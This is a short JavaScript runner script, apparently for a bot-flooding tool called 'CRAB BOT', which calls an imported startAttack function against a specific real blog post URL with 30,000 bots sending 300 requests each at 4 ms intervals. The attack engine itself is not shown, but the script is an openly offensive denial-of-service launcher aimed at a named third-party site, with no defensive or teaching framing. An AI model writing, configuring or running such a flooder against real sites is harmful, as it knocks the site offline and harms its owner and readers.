const { startAttack } = require('./engine');

const targetUrl = 'https://m3fox.blogspot.com/2025/09/fake-identity-zionism-mohamed-ahmed-shawky.html';
const options = {
    botCount: 30000,
    requestsPerBot: 300,
    intervalMs: 4,
    payloadType: 'random'
};

console.log('--- CRAB BOT AUTOMATED RUNNER ---');
startAttack(targetUrl, options).then(() => {
    console.log('--- RUNNER FINISHED ---');
    process.exit(0);
}).catch(err => {
    console.error('Runner Error:', err);
    process.exit(1);
});
